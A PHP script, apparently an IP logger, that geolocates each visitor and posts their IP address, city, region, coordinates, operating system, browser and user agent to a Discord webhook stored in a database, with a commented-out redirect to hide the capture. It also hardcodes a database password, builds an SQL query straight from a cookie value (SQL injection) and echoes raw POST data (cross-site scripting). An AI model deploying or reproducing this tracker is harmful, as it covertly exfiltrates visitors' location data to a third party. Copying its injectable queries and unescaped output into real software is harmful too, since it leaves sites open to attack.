<?php
$servername = "localhost";
$username = "user";
$password = "QAZ123qaz";
$dbname = "test";
// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
ini_set('display_errors','off');
//Get data from index.php via cockie

$id = $_COOKIE['id'];
$timezone = $_COOKIE['time'];
$ba = $_COOKIE['ba'];
$br = $_COOKIE['br'];
$os = $_COOKIE['os'];
//Debug Mode
$debug = 1;



$user_agent     =   $_SERVER['HTTP_USER_AGENT'];


$time = date('H:i:s Y-m-d');
require_once('script.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
//LOGGING END
$sql = "SELECT * FROM main2 where id = '".$id."' ";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    // output data of each row
    while($row = $result->fetch_assoc()) {
        $acces = $row['acces'];
        $log = $row['log'];
        $url = $row["url"];
        $webhook=  $row['discord'];

    }

} else {
    echo "0 results";
}
$conn->close();
echo $_POST['data'];
//MESSAGE SEND TO DISCORD
$make_json = json_encode(array ('content'=>
    "
IP: {$geoplugin->ip}
Os: $os
Browser: $br
Server time: $time
City: {$geoplugin->city}
Region: {$geoplugin->region}
Region Code: {$geoplugin->regionCode}
Country: {$geoplugin->countryName}
Country code: {$geoplugin->countryCode}
Latitude(ip): {$geoplugin->latitude}
Longitude(ip): {$geoplugin->longitude}
Accuracy (Miles(ip): {$geoplugin->locationAccuracyRadius}
Timezone: $timezone
==========================================
Advance
lol: $geoplugin->timezone
UserAgent: $ba
=========================================================
"
));

if($debug){
    echo $id.'<br>';
    echo $acces .'<br>';
    echo $log .'<br>';
    echo $url .'<br>';
    echo $webhook .'<br>';
    echo $timezone.'<br>';
    echo $ba.'<br>';
    echo $os.'<br>';


}

$exec = curl_init("$webhook");
curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $exec, CURLOPT_POST, 1);
curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
curl_setopt( $exec, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $exec, CURLOPT_HEADER, 0);
curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec( $exec );
echo  $_POST['data'];

//header("Location:$url ");
?>

